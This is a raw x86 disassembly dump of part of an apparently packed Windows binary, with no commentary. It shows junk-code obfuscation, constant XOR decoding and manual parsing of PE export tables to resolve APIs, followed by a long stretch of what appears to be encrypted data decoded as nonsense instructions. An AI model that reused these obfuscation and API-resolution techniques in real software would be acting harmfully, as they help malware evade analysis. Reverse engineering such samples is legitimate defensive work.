  40d652:	jg     0x40d696
  40d658:	jmp    0x40d66b
  40d65d:	push   0x28fc
  40d662:	push   DWORD PTR [ebp-0x20]
  40d665:	call   DWORD PTR ds:0x43c9a8
  40d66b:	cmp    DWORD PTR ds:0x437783,0x5
  40d672:	jne    0x40d683
  40d678:	mov    eax,ds:0x437783
  40d67d:	dec    eax
  40d67e:	mov    ds:0x437783,eax
  40d683:	xor    eax,eax
  40d685:	xor    eax,DWORD PTR ds:0x437783
  40d68b:	dec    eax
  40d68c:	mov    ds:0x437783,eax
  40d691:	jmp    0x40d63e
  40d696:	mov    eax,DWORD PTR [ebp+0x8]
  40d699:	mov    DWORD PTR [ebp-0x58],eax
  40d69c:	mov    DWORD PTR ds:0x43775f,0x4c77
  40d6a6:	mov    DWORD PTR [ebp-0x50],0xf89c85b0
  40d6ad:	mov    eax,DWORD PTR [ebp-0x58]
  40d6b0:	or     DWORD PTR ds:0x43775b,0x43776f
  40d6ba:	movsx  eax,BYTE PTR [eax]
  40d6bd:	cdq    
  40d6be:	xor    DWORD PTR ds:0x437753,0x4377bb
  40d6c8:	sub    eax,0x5424137
  40d6cd:	mov    DWORD PTR ds:0x43775f,0x3435
  40d6d7:	sbb    edx,0x0
  40d6da:	xor    eax,0x8a29a14b
  40d6df:	and    DWORD PTR ds:0x43776f,0x4377ab
  40d6e9:	xor    edx,0x0
  40d6ec:	mov    DWORD PTR ds:0x43773f,0x124f
  40d6f6:	mov    DWORD PTR [ebp-0x144],eax
  40d6fc:	mov    DWORD PTR [ebp-0x140],edx
  40d702:	mov    DWORD PTR ds:0x4377ab,0x7835
  40d70c:	cmp    DWORD PTR [ebp-0x144],0x70941e5d
  40d716:	mov    DWORD PTR ds:0x43776f,0x724a
  40d720:	jne    0x40d88d
  40d726:	mov    DWORD PTR ds:0x43778b,0x6e67
  40d730:	cmp    DWORD PTR [ebp-0x140],0xffffffff
  40d737:	mov    DWORD PTR ds:0x43778f,0x1a8
  40d741:	jne    0x40d88d
  40d747:	adc    ecx,0x38df
  40d74d:	mov    eax,DWORD PTR [ebp-0x58]
  40d750:	and    ecx,DWORD PTR ds:0x437787
  40d756:	mov    ecx,DWORD PTR [ebp-0x58]
  40d759:	add    ecx,DWORD PTR [eax+0x3c]
  40d75c:	and    DWORD PTR ds:0x43771f,0x0
  40d766:	xor    eax,eax
  40d768:	add    eax,DWORD PTR ds:0x43771f
  40d76e:	inc    eax
  40d76f:	mov    ds:0x43771f,eax
  40d774:	cmp    DWORD PTR ds:0x43771f,0xd
  40d77b:	ja     0x40d7bb
  40d781:	jmp    0x40d796
  40d786:	push   0x43772b
  40d78b:	push   0x5f6b
  40d790:	call   DWORD PTR ds:0x43c9ac
  40d796:	cmp    DWORD PTR ds:0x43771f,0xc
  40d79d:	jne    0x40d7ae
  40d7a3:	mov    eax,ds:0x43771f
  40d7a8:	inc    eax
  40d7a9:	mov    ds:0x43771f,eax
  40d7ae:	cmp    DWORD PTR ds:0x43771f,0x18
  40d7b5:	jb     0x40d766
  40d7bb:	mov    DWORD PTR [ebp-0x54],ecx
  40d7be:	and    DWORD PTR ds:0x437777,ebx
  40d7c4:	mov    eax,DWORD PTR [ebp-0x50]
  40d7c7:	and    DWORD PTR ds:0x43778b,0x0
  40d7d1:	mov    ecx,DWORD PTR ds:0x43778b
  40d7d7:	inc    ecx
  40d7d8:	mov    DWORD PTR ds:0x43778b,ecx
  40d7de:	cmp    DWORD PTR ds:0x43778b,0xb
  40d7e5:	ja     0x40d823
  40d7eb:	jmp    0x40d7fc
  40d7f0:	push   DWORD PTR [ebp-0x24]
  40d7f3:	push   DWORD PTR [ebp-0x1c]
  40d7f6:	call   DWORD PTR ds:0x43c9b0
  40d7fc:	cmp    DWORD PTR ds:0x43778b,0xa
  40d803:	jne    0x40d816
  40d809:	mov    ecx,DWORD PTR ds:0x43778b
  40d80f:	inc    ecx
  40d810:	mov    DWORD PTR ds:0x43778b,ecx
  40d816:	cmp    DWORD PTR ds:0x43778b,0x19
  40d81d:	jb     0x40d7d1
  40d823:	xor    eax,0x75108b5
  40d828:	xor    DWORD PTR ds:0x43771b,0x4377a3
  40d832:	add    eax,0x3272fb
  40d837:	mov    ecx,DWORD PTR ds:0x43771b
  40d83d:	mov    ecx,DWORD PTR [ebp-0x54]
  40d840:	cmp    DWORD PTR [ecx+0x54],eax
  40d843:	je     0x40d85e
  40d849:	mov    eax,DWORD PTR [ebp-0x54]
  40d84c:	mov    DWORD PTR ds:0x437723,0x3d6
  40d856:	mov    DWORD PTR [ebp-0x5c],eax
  40d859:	jmp    0x40d8b7
  40d85e:	sbb    eax,DWORD PTR ds:0x437797
  40d864:	mov    eax,DWORD PTR [ebp-0x50]
  40d867:	adc    DWORD PTR ds:0x43772b,0x43775b
  40d871:	xor    eax,0x75108b5
  40d876:	add    eax,0x3272fb
  40d87b:	mov    DWORD PTR ds:0x437723,0x699f
  40d885:	mov    DWORD PTR [ebp-0x5c],eax
  40d888:	jmp    0x40d8b7
  40d88d:	mov    eax,ds:0x4377ab
  40d892:	sbb    eax,DWORD PTR ds:0x437777
  40d898:	mov    ds:0x4377ab,eax
  40d89d:	mov    eax,DWORD PTR [ebp-0x50]
  40d8a0:	and    DWORD PTR ds:0x437727,0x192e
  40d8aa:	xor    eax,0x75108b5
  40d8af:	add    eax,0x3272fb
  40d8b4:	mov    DWORD PTR [ebp-0x5c],eax
  40d8b7:	and    DWORD PTR ds:0x4377bb,edx
  40d8bd:	mov    eax,DWORD PTR [ebp-0x5c]
  40d8c0:	mov    DWORD PTR [ebp-0x18],eax
  40d8c3:	sbb    DWORD PTR ds:0x437743,0x1fc4
  40d8cd:	mov    eax,DWORD PTR [ebp-0x3c]
  40d8d0:	add    DWORD PTR ds:0x43774b,0x43776f
  40d8da:	xor    eax,0x75108b5
  40d8df:	add    eax,0x3272fb
  40d8e4:	mov    DWORD PTR ds:0x437737,0x3ad8
  40d8ee:	cmp    DWORD PTR [ebp-0x18],eax
  40d8f1:	mov    DWORD PTR ds:0x43779b,0x476a
  40d8fb:	jne    0x40d940
  40d901:	adc    DWORD PTR ds:0x43771f,0x22a8
  40d90b:	mov    eax,DWORD PTR [ebp-0x3c]
  40d90e:	sbb    DWORD PTR ds:0x437777,0x437773
  40d918:	xor    eax,0x75108b5
  40d91d:	sub    DWORD PTR ds:0x43770f,0x715d
  40d927:	add    eax,0x3272fb
  40d92c:	mov    DWORD PTR ds:0x43774f,0x301
  40d936:	jmp    0x414dde
  40d93b:	jmp    0x40de5d
  40d940:	and    DWORD PTR ds:0x43779b,0x0
  40d94a:	jmp    0x40d95d
  40d94f:	xor    eax,eax
  40d951:	or     eax,DWORD PTR ds:0x43779b
  40d957:	inc    eax
  40d958:	mov    ds:0x43779b,eax
  40d95d:	cmp    DWORD PTR ds:0x43779b,0x10
  40d964:	jae    0x40d996
  40d96a:	cmp    DWORD PTR ds:0x43779b,0x1d
  40d971:	jbe    0x40d996
  40d977:	jmp    0x40d991
  40d97c:	push   0x43773f
  40d981:	push   0x437777
  40d986:	push   0x3430
  40d98b:	call   DWORD PTR ds:0x43c9b4
  40d991:	jmp    0x40d94f
  40d996:	mov    eax,DWORD PTR [ebp-0x18]
  40d999:	mov    DWORD PTR [ebp-0x7c],eax
  40d99c:	mov    eax,DWORD PTR [ebp+0x8]
  40d99f:	mov    DWORD PTR [ebp-0x78],eax
  40d9a2:	add    eax,0x76e2
  40d9a7:	mov    DWORD PTR [ebp-0x60],0xf89c85b0
  40d9ae:	add    edx,eax
  40d9b0:	mov    DWORD PTR [ebp-0x64],0xf89c85b3
  40d9b7:	mov    eax,DWORD PTR [ebp-0x7c]
  40d9ba:	mov    ecx,DWORD PTR [ebp-0x64]
  40d9bd:	adc    DWORD PTR ds:0x43773f,0x7640
  40d9c7:	xor    ecx,0x75108b5
  40d9cd:	add    ecx,0x3272fb
  40d9d3:	and    DWORD PTR ds:0x43779b,0x0
  40d9dd:	jmp    0x40d9ef
  40d9e2:	mov    edx,DWORD PTR ds:0x43779b
  40d9e8:	inc    edx
  40d9e9:	mov    DWORD PTR ds:0x43779b,edx
  40d9ef:	cmp    DWORD PTR ds:0x43779b,0x17
  40d9f6:	jae    0x40da40
  40d9fc:	cmp    DWORD PTR ds:0x43779b,0xa
  40da03:	ja     0x40da40
  40da09:	jmp    0x40da21
  40da0e:	push   DWORD PTR [ebp-0x1c]
  40da11:	push   0x43779b
  40da16:	push   0x437124
  40da1b:	call   DWORD PTR ds:0x43c9b8
  40da21:	cmp    DWORD PTR ds:0x43779b,0x9
  40da28:	jne    0x40da3b
  40da2e:	mov    edx,DWORD PTR ds:0x43779b
  40da34:	inc    edx
  40da35:	mov    DWORD PTR ds:0x43779b,edx
  40da3b:	jmp    0x40d9e2
  40da40:	mov    edx,DWORD PTR [ebp-0x60]
  40da43:	xor    edx,0x75108b5
  40da49:	add    edx,0x3272fb
  40da4f:	xor    DWORD PTR ds:0x43777f,0x437757
  40da59:	imul   ecx,edx
  40da5c:	cmp    eax,ecx
  40da5e:	mov    DWORD PTR ds:0x437747,0x39af
  40da68:	jne    0x40dadd
  40da6e:	sbb    eax,eax
  40da70:	mov    eax,DWORD PTR [ebp-0x64]
  40da73:	sub    DWORD PTR ds:0x43779b,ebx
  40da79:	xor    eax,0x75108b5
  40da7e:	movzx  ecx,BYTE PTR ds:0x43773f
  40da85:	add    DWORD PTR ds:0x437767,ecx
  40da8b:	add    eax,0x3272fb
  40da90:	add    DWORD PTR ds:0x437727,ecx
  40da96:	mov    ecx,DWORD PTR [ebp-0x60]
  40da99:	xor    ecx,0x75108b5
  40da9f:	and    DWORD PTR ds:0x437793,0x4377b7
  40daa9:	add    ecx,0x3272fb
  40daaf:	and    DWORD PTR ds:0x43770f,0x10c
  40dab9:	imul   eax,ecx
  40dabc:	mov    DWORD PTR ds:0x43778f,0x70da
  40dac6:	mov    DWORD PTR [ebp-0x80],eax
  40dac9:	mov    DWORD PTR ds:0x43772b,0x2b15
  40dad3:	jmp    0x40de20
  40dad8:	jmp    0x40de00
  40dadd:	lea    eax,[ebp-0x70]
  40dae0:	mov    DWORD PTR ds:0x43779b,0x12
  40daea:	cmp    DWORD PTR ds:0x43779b,0x0
  40daf1:	je     0x40db28
  40daf7:	cmp    DWORD PTR ds:0x43779b,0x1e
  40dafe:	jbe    0x40db28
  40db04:	jmp    0x40db14
  40db09:	push   0x8f8f
  40db0e:	call   DWORD PTR ds:0x43c9bc
  40db14:	xor    ecx,ecx
  40db16:	add    ecx,DWORD PTR ds:0x43779b
  40db1c:	dec    ecx
  40db1d:	mov    DWORD PTR ds:0x43779b,ecx
  40db23:	jmp    0x40daea
  40db28:	mov    DWORD PTR [ebp-0x6c],eax
  40db2b:	mov    DWORD PTR ds:0x437753,0x63cd
  40db35:	mov    eax,DWORD PTR [ebp-0x6c]
  40db38:	mov    DWORD PTR [eax],0xf89c85b0
  40db3e:	mov    edx,DWORD PTR ds:0x43771f
  40db44:	sub    DWORD PTR ds:0x43771b,edx
  40db4a:	mov    eax,DWORD PTR [ebp-0x70]
  40db4d:	xor    eax,0x75108b5
  40db52:	and    DWORD PTR ds:0x4377b3,0x0
  40db5c:	jmp    0x40db6e
  40db61:	mov    edx,DWORD PTR ds:0x4377b3
  40db67:	inc    edx
  40db68:	mov    DWORD PTR ds:0x4377b3,edx
  40db6e:	cmp    DWORD PTR ds:0x4377b3,0x1b
  40db75:	jae    0x40db9b
  40db7b:	cmp    DWORD PTR ds:0x4377b3,0x27
  40db82:	jl     0x40db9b
  40db88:	jmp    0x40db96
  40db8d:	push   DWORD PTR [ebp-0x24]
  40db90:	call   DWORD PTR ds:0x43c9c4
  40db96:	jmp    0x40db61
  40db9b:	mov    ecx,DWORD PTR [ebp-0x7c]
  40db9e:	mov    DWORD PTR ds:0x437737,0x11
  40dba8:	cmp    DWORD PTR ds:0x437737,0x0
  40dbaf:	je     0x40dc08
  40dbb5:	cmp    DWORD PTR ds:0x437737,0x4
  40dbbc:	jbe    0x40dc08
  40dbc2:	jmp    0x40dbda
  40dbc7:	push   0x43713c
  40dbcc:	push   0x437104
  40dbd1:	push   DWORD PTR [ebp-0x1c]
  40dbd4:	call   DWORD PTR ds:0x43c9c8
  40dbda:	cmp    DWORD PTR ds:0x437737,0x5
  40dbe1:	jne    0x40dbf6
  40dbe7:	xor    edx,edx
  40dbe9:	add    edx,DWORD PTR ds:0x437737
  40dbef:	dec    edx
  40dbf0:	mov    DWORD PTR ds:0x437737,edx
  40dbf6:	mov    edx,DWORD PTR ds:0x437737
  40dbfc:	dec    edx
  40dbfd:	mov    DWORD PTR ds:0x437737,edx
  40dc03:	jmp    0x40dba8
  40dc08:	mov    eax,DWORD PTR [ecx+eax*8+0x1939850]
  40dc0f:	mov    DWORD PTR [ebp-0x68],eax
  40dc12:	and    ecx,DWORD PTR ds:0x43776b
  40dc18:	mov    eax,DWORD PTR [ebp-0x68]
  40dc1b:	mov    ecx,DWORD PTR [ebp-0x64]
  40dc1e:	sbb    DWORD PTR ds:0x43778b,0x5d76
  40dc28:	xor    ecx,0x75108b5
  40dc2e:	add    ecx,0x3272fb
  40dc34:	mov    edx,DWORD PTR [ebp-0x60]
  40dc37:	sub    DWORD PTR ds:0x43776f,0x437717
  40dc41:	xor    edx,0x75108b5
  40dc47:	add    edx,0x3272fb
  40dc4d:	adc    DWORD PTR ds:0x437733,0x2ce3
  40dc57:	imul   ecx,edx
  40dc5a:	mov    DWORD PTR ds:0x4377a3,0x769c
  40dc64:	cmp    eax,ecx
  40dc66:	mov    DWORD PTR ds:0x437773,0x7b44
  40dc70:	je     0x40dcd1
  40dc76:	mov    eax,DWORD PTR [ebp-0x64]
  40dc79:	sbb    DWORD PTR ds:0x43778b,0x52d3
  40dc83:	xor    eax,0x75108b5
  40dc88:	add    DWORD PTR ds:0x437793,0x279
  40dc92:	add    eax,0x3272fb
  40dc97:	mov    ecx,DWORD PTR [ebp-0x68]
  40dc9a:	imul   eax,ecx
  40dc9d:	add    DWORD PTR ds:0x4377bb,0x1ffc
  40dca7:	add    eax,DWORD PTR [ebp-0x78]
  40dcaa:	mov    DWORD PTR [ebp-0x74],eax
  40dcad:	mov    eax,DWORD PTR [ebp-0x74]
  40dcb0:	mov    DWORD PTR ds:0x43772f,0x1a32
  40dcba:	mov    DWORD PTR [ebp-0x80],eax
  40dcbd:	mov    DWORD PTR ds:0x43773f,0x4cc2
  40dcc7:	jmp    0x40de20
  40dccc:	jmp    0x40ddc7
  40dcd1:	mov    DWORD PTR ds:0x437743,0x12
  40dcdb:	cmp    DWORD PTR ds:0x437743,0x0
  40dce2:	je     0x40dd20
  40dce8:	cmp    DWORD PTR ds:0x437743,0x1f
  40dcef:	jbe    0x40dd20
  40dcf5:	jmp    0x40dd10
  40dcfa:	push   0x3dfe
  40dcff:	push   DWORD PTR [ebp-0x18]
  40dd02:	push   DWORD PTR [ebp-0x28]
  40dd05:	push   0x437000
  40dd0a:	call   DWORD PTR ds:0x43c9cc
  40dd10:	mov    eax,ds:0x437743
  40dd15:	dec    eax
  40dd16:	mov    ds:0x437743,eax
  40dd1b:	jmp    0x40dcdb
  40dd20:	mov    eax,DWORD PTR [ebp-0x64]
  40dd23:	dec    ecx
  40dd24:	xor    eax,0x75108b5
  40dd29:	adc    ecx,DWORD PTR ds:0x43779f
  40dd2f:	add    eax,0x3272fb
  40dd34:	and    DWORD PTR ds:0x43771f,0x0
  40dd3e:	mov    ecx,DWORD PTR ds:0x43771f
  40dd44:	inc    ecx
  40dd45:	mov    DWORD PTR ds:0x43771f,ecx
  40dd4b:	cmp    DWORD PTR ds:0x43771f,0x27
  40dd52:	jg     0x40dd8f
  40dd58:	jmp    0x40dd82
  40dd5d:	push   DWORD PTR [ebp-0xc]
  40dd60:	push   0x6584
  40dd65:	push   0x4377af
  40dd6a:	push   DWORD PTR [ebp-0x24]
  40dd6d:	push   0x1eb1
  40dd72:	push   0x5818
  40dd77:	push   0x1de6
  40dd7c:	call   DWORD PTR ds:0x43c9d0
  40dd82:	cmp    DWORD PTR ds:0x43771f,0x1c
  40dd89:	jb     0x40dd3e
  40dd8f:	mov    ecx,DWORD PTR [ebp-0x60]
  40dd92:	xor    ecx,0x75108b5
  40dd98:	xor    DWORD PTR ds:0x437713,0x26bd
  40dda2:	add    ecx,0x3272fb
  40dda8:	imul   eax,ecx
  40ddab:	mov    DWORD PTR ds:0x43778b,0x2ea1
  40ddb5:	mov    DWORD PTR [ebp-0x80],eax
  40ddb8:	mov    DWORD PTR ds:0x43778b,0x4108
  40ddc2:	jmp    0x40de20
  40ddc7:	sub    DWORD PTR ds:0x43778b,edx
  40ddcd:	mov    eax,DWORD PTR [ebp-0x60]
  40ddd0:	xor    DWORD PTR ds:0x437747,0x2583
  40ddda:	xor    eax,0x75108b5
  40dddf:	xor    DWORD PTR ds:0x43779b,0x437773
  40dde9:	add    eax,0x3272fb
  40ddee:	mov    DWORD PTR ds:0x43779b,0x27ba
  40ddf8:	mov    DWORD PTR [ebp-0x80],eax
  40ddfb:	jmp    0x40de20
  40de00:	sub    DWORD PTR ds:0x43777f,edi
  40de06:	mov    eax,DWORD PTR [ebp-0x60]
  40de09:	xor    eax,0x75108b5
  40de0e:	add    eax,0x3272fb
  40de13:	sbb    DWORD PTR ds:0x43771f,0x437737
  40de1d:	mov    DWORD PTR [ebp-0x80],eax
  40de20:	and    eax,DWORD PTR ds:0x437793
  40de26:	mov    eax,DWORD PTR [ebp-0x80]
  40de29:	mov    DWORD PTR [ebp-0x30],eax
  40de2c:	mov    eax,DWORD PTR [ebp-0x3c]
  40de2f:	xor    eax,0x75108b5
  40de34:	add    eax,0x3272fb
  40de39:	cmp    DWORD PTR [ebp-0x30],eax
  40de3c:	jne    0x40de54
  40de42:	mov    eax,DWORD PTR [ebp-0x3c]
  40de45:	xor    eax,0x75108b5
  40de4a:	add    eax,0x3272fb
  40de4f:	jmp    0x414dde
  40de54:	mov    eax,DWORD PTR [ebp-0x30]
  40de57:	mov    eax,DWORD PTR [eax+0x18]
  40de5a:	mov    DWORD PTR [ebp-0x4],eax
  40de5d:	mov    eax,DWORD PTR [ebp-0x30]
  40de60:	mov    ecx,DWORD PTR [ebp+0x8]
  40de63:	add    ecx,DWORD PTR [eax+0x20]
  40de66:	mov    DWORD PTR [ebp-0xc],ecx
  40de69:	mov    eax,DWORD PTR [ebp-0x30]
  40de6c:	mov    ecx,DWORD PTR [ebp+0x8]
  40de6f:	add    ecx,DWORD PTR [eax+0x24]
  40de72:	mov    DWORD PTR [ebp-0x24],ecx
  40de75:	mov    eax,DWORD PTR [ebp-0x30]
  40de78:	mov    ecx,DWORD PTR [ebp+0x8]
  40de7b:	add    ecx,DWORD PTR [eax+0x1c]
  40de7e:	mov    DWORD PTR [ebp-0x20],ecx
  40de81:	jmp    0x41023e
  40de86:	mov    eax,DWORD PTR [ebp-0x44]
  40de89:	mov    ecx,DWORD PTR [ebp-0xc]
  40de8c:	mov    edx,DWORD PTR [ebp+0x8]
  40de8f:	jmp    0x410218
  40de94:	in     al,0xfc
  40de96:	xchg   esi,eax
  40de97:	sub    BYTE PTR [esi+0x30],dh
  40de9a:	fs push esp
  40de9c:	jbe    0x40de3b
  40de9e:	jmp    0x40deb3
  40dea0:	(bad)  
  40dea1:	xor    DWORD PTR [ebp-0x7a],esp
  40dea4:	outs   dx,BYTE PTR ds:[esi]
  40dea5:	and    al,0x7b
  40dea7:	jnp    0x40de90
  40dea9:	cwde   
  40deaa:	jnp    0x40df27
  40deac:	add    edx,ebp
  40deae:	or     ah,al
  40deb0:	or     ebx,ebx
  40deb2:	in     eax,dx
  40deb3:	add    al,0xdc
  40deb5:	add    eax,0xcce5f3e8
  40deba:	mov    cl,0xc9
  40debc:	shl    BYTE PTR [eax-0x4e39270a],1
  40dec2:	(bad)  
  40dec4:	fsubp  st(0),st
  40dec6:	sar    bh,cl
  40dec8:	in     al,dx
  40dec9:	(bad)  
  40deca:	std    
  40decb:	hlt    
  40decc:	repz f2xm1 
  40decf:	cmc    
  40ded0:	add    edi,ebx
  40ded2:	or     edx,ebp
  40ded4:	(bad)
  40ded8:	jecxz  0x40deac
  40deda:	scas   eax,DWORD PTR es:[edi]
  40dedb:	mov    ebp,0xf3b4cdf6
  40dee0:	jmp    0xf80fc5cd
  40dee5:	fsubr  st,st(5)
  40dee7:	hlt    
  40dee8:	add    BYTE PTR [eax-0x24f92e0b],bh
  40deee:	or     eax,DWORD PTR [ebx]
  40def0:	(bad)  
  40def1:	leave  
  40def2:	dec    edx
  40def4:	fimul  WORD PTR [eax]
  40def6:	jmp    0xe0c9:0xa4d1e4b2
  40defd:	cmc    
  40defe:	(bad)  
  40deff:	rcl    eax,cl
  40df01:	clc    
  40df02:	in     al,0xe5
  40df04:	cld    
  40df05:	mov    ch,0xbf
  40df07:	test   bh,0x0
  40df0a:	add    ah,ah
  40df0c:	repz mov ecx,0x40af105
  40df12:	or     cl,bl
  40df14:	fdivr  st,st(6)
  40df16:	jmp    0xbcce:0xd0aeaac1
  40df1d:	aad    0xdb
  40df1f:	lock icebp 
  40df21:	in     al,0xcb
  40df23:	in     eax,0xf1
  40df25:	aam    0xcd
  40df27:	fadd   QWORD PTR [eax]
  40df29:	in     eax,dx
  40df2a:	add    eax,0xdbdbc100
  40df2f:	jmp    esp
  40df31:	out    0xd4,eax
  40df33:	in     al,0xce
  40df35:	jmp    0x40df0f
  40df37:	enter  0xe2e2,0xc5
  40df3b:	loope  0x40deeb
  40df3d:	jmp    0xb7f1:0xb5fff6d2
  40df44:	(bad)  
  40df45:	fcmovu st,st(2)
  40df47:	mov    esp,0xd1dffbdd
  40df4c:	int3   
  40df4d:	test   ch,0x5
  40df50:	fdivp  st(5),st
  40df52:	mov    esp,0xc006fced
  40df57:	(bad)  
  40df59:	loopne 0x40df26
  40df5b:	repnz mov cl,0xa9
  40df5e:	shl    bl,0xce
  40df61:	(bad)  
  40df62:	in     eax,0xb3
  40df64:	les    esi,FWORD PTR [esi+esi*8-0x1e201c3d]
  40df6b:	add    al,0xeb
  40df6d:	test   DWORD PTR [ebx],0xef0ed7e0
  40df73:	int    0x1
  40df75:	std    
  40df76:	icebp  
  40df77:	test   al,0xe6
  40df79:	mov    ebp,0xf4c1efd1
  40df7e:	sar    dl,cl
  40df80:	leave  
  40df81:	out    dx,al
  40df82:	repnz retf 
  40df84:	retf   0xdcb1
  40df87:	aam    0xdf
  40df89:	mov    ecx,0xbc3f5ff
  40df8e:	inc    edx
  40df90:	loop   0x40df6a
  40df92:	add    eax,DWORD PTR ds:0xcbfed90d
  40df98:	stos   BYTE PTR es:[edi],al
  40df99:	repnz mov dh,0xd2
  40df9c:	(bad)  
  40df9d:	in     al,dx
  40df9e:	retf   0xf2cd
  40dfa1:	fdivp  st(0),st
  40dfa3:	in     eax,0xd9
  40dfa5:	into   
  40dfa6:	mov    edx,0xecd9fcbf
  40dfab:	add    bh,BYTE PTR [esi+0xffcd4f2]
  40dfb1:	(bad)  
  40dfb2:	test   BYTE PTR [eax],0x13
  40dfb5:	leave  
  40dfb6:	add    al,0xcc
  40dfb8:	fsub   st,st(7)
  40dfba:	retf   
  40dfbb:	jmp    0xd8ce:0xb7eccaed
  40dfc2:	mov    edi,0xbbb9cfb3
  40dfc7:	int3   
  40dfc8:	iret   
  40dfc9:	int    0xd9
  40dfcb:	xlat   BYTE PTR ds:[ebx]
  40dfcc:	ret    0xd1c4
  40dfcf:	icebp  
  40dfd0:	call   0x343c9bf
  40dfd5:	iret   
  40dfd6:	ror    esi,cl
  40dfd8:	ret    0xdcad
  40dfdb:	(bad)  
  40dfdc:	lods   eax,DWORD PTR ds:[esi]
  40dfdd:	retf   
  40dfde:	(bad)  
  40dfdf:	into   
  40dfe0:	scas   al,BYTE PTR es:[edi]
  40dfe1:	in     al,dx
  40dfe2:	int3   
  40dfe3:	sti    
  40dfe4:	clc    
  40dfe5:	mov    ch,0xd7
  40dfe7:	(bad)  
  40dfe8:	mov    esi,0x6fff007
  40dfed:	loope  0x40dfd6
  40dfef:	cld    
  40dff0:	bswap  edx
  40dff2:	in     eax,dx
  40dff3:	(bad)  
  40dff5:	out    0x13,eax
  40dff7:	loop   0x40dfe4
  40dff9:	lock in eax,dx
  40dffb:	lods   eax,DWORD PTR ds:[esi]
  40dffc:	in     eax,dx
  40dffd:	loop   0x40dfd9
  40dfff:	mov    ch,0xd2
  40e001:	ftst   
  40e003:	clc    
  40e004:	aam    0xd2
  40e006:	shl    dl,1
  40e008:	ret    
  40e009:	mov    ch,0xbf
  40e00b:	mov    esp,0xe1ddc1c3
  40e010:	std    
  40e011:	cli    
  40e012:	or     esp,ebx
  40e014:	jmp    0xd91ac8f6
  40e019:	repnz fsubp st(2),st
  40e01c:	mov    dl,0xe6
  40e01e:	in     al,dx
  40e01f:	into   
  40e020:	jmp    0xf2c3:0xeef6edad
  40e027:	aad    0xf1
  40e029:	stc    
  40e02a:	mov    ebp,0xe6c7e200
  40e02f:	loopne 0x40e030
  40e031:	pminub mm4,mm6
  40e034:	std    
  40e035:	jecxz  0x40e019
  40e037:	mov    bl,0xef
  40e039:	ret    
  40e03a:	mov    esi,0xdadbefc1
  40e03f:	retf   
  40e040:	rcr    dh,0xb5
  40e043:	cli    
  40e044:	in     eax,dx
  40e045:	aad    0xdf
  40e047:	repz mov esp,0xf4c102f3
  40e04d:	sti    
  40e04e:	ret    0xc5e0
  40e051:	add    bh,ah
  40e053:	into   
  40e054:	sti    
  40e055:	fld    DWORD PTR [ecx]
  40e057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e058:	call   0xc3eeb206
  40e05d:	hlt    
  40e05e:	loopne 0x40e04a
  40e060:	enter  0xc5d5,0xce
  40e064:	sti    
  40e065:	cli    
  40e066:	jmp    0xd23dd128
  40e06b:	int3   
  40e06c:	clc    
  40e06d:	rcl    dh,0x3
  40e070:	retf   
  40e071:	cmc    
  40e072:	fiadd  DWORD PTR [ebx]
  40e074:	push   es
  40e075:	rcr    edx,0xc8
  40e078:	repnz icebp 
  40e07a:	rol    ebp,cl
  40e07c:	repnz (bad) 
  40e07e:	ret    0xe0b2
  40e081:	(bad)  
  40e083:	fdivp  st(5),st
  40e085:	retf   
  40e086:	add    ebp,eax
  40e088:	iret   
  40e089:	xlat   BYTE PTR ds:[ebx]
  40e08a:	add    BYTE PTR [eax+ebx*8],al
  40e08d:	shl    bh,0xe4
  40e090:	(bad)  
  40e092:	add    ah,ah
  40e094:	out    dx,eax
  40e095:	loop   0x40e075
  40e097:	loopne 0x40e076
  40e099:	jmp    0xf6d1:0xe1b7afc3
  40e0a0:	out    dx,eax
  40e0a1:	lds    edi,FWORD PTR [ebx-0x1e300a22]
  40e0a7:	sar    edi,0xf1
  40e0aa:	int3   
  40e0ab:	fincstp 
  40e0ad:	aam    0xc5
  40e0af:	(bad)  
  40e0b1:	push   es
  40e0b2:	jmp    0xc125c794
  40e0b7:	mov    edi,0xc4ace3e3
  40e0bc:	call   0xe917c86e
  40e0c1:	out    dx,al
  40e0c2:	aam    0xce
  40e0c4:	mov    dh,0xce
  40e0c6:	fucomip st,st(1)
  40e0c8:	fcmovu st,st(5)
  40e0ca:	mov    ah,0xbf
  40e0cc:	cmc    
  40e0cd:	mov    ebp,0xdfe7fabc
  40e0d2:	jmp    0xe522dfba
  40e0d7:	mov    dl,0xb8
  40e0d9:	loope  0x40e09b
  40e0db:	aam    0xd3
  40e0dd:	lds    esi,FWORD PTR [eax-0x7253526]
  40e0e3:	mov    ebx,0xceddf3b4
  40e0e8:	add    esi,ebx
  40e0ea:	sar    esi,0xdd
  40e0ed:	jmp    eax
  40e0ef:	leave  
  40e0f0:	lock jmp 0xde0c:0xe7daefff
  40e0f8:	out    0xb1,al
  40e0fa:	int    0xf3
  40e0fc:	lods   al,BYTE PTR ds:[esi]
  40e0fd:	imul   ah
  40e0ff:	jmp    0x40e0b6
  40e101:	jmp    0xeff3e004
  40e106:	in     eax,dx
  40e107:	out    dx,eax
  40e108:	rcr    dl,cl
  40e10a:	clc    
  40e10b:	out    0xc3,eax
  40e10d:	ret    
  40e10e:	icebp  
  40e10f:	add    esi,esi
  40e111:	jmp    0x32eca16
  40e116:	adc    esp,ebx
  40e118:	repnz icebp 
  40e11a:	loop   0x40e106
  40e11c:	mov    cl,0xbb
  40e11e:	out    0xf4,al
  40e120:	(bad)  
  40e122:	out    dx,eax
  40e123:	lds    edi,FWORD PTR [edx-0x2827292a]
  40e129:	ret    0xe7ed
  40e12c:	(bad)  
  40e12d:	fmul   QWORD PTR [ebx]
  40e12f:	(bad)  
  40e130:	loop   0x40e0f8
  40e132:	dec    dh
  40e134:	into   
  40e135:	(bad)  
  40e136:	clc    
  40e137:	(bad)  
  40e138:	in     eax,dx
  40e139:	in     al,0xb0
  40e13b:	enter  0xecc0,0xcc
  40e13f:	cmc    
  40e140:	out    0xfa,al
  40e142:	mov    eax,0xdcddddeb
  40e147:	fstp   TBYTE PTR [ebp+0x2dffab5]
  40e14d:	inc    DWORD PTR [ebx]
  40e14f:	ret    0xbdfd
  40e152:	add    al,0xcb
  40e154:	pop    es
  40e155:	fcmovnu st,st(5)
  40e157:	repz iret 
  40e159:	int3   
  40e15a:	in     eax,0xac
  40e15c:	ror    edi,1
  40e15e:	lds    edi,FWORD PTR [edx-0x4a112534]
  40e164:	out    dx,al
  40e165:	std    
  40e166:	repnz out dx,eax
  40e168:	(bad)  
  40e16a:	sar    ebp,0xf7
  40e16d:	cld    
  40e16e:	shl    al,0xf6
  40e171:	test   DWORD PTR [edx],0xfa06d9f9
  40e177:	loop   0x40e161
  40e179:	shl    ebp,0xd6
  40e17c:	repnz mov dh,0xe4
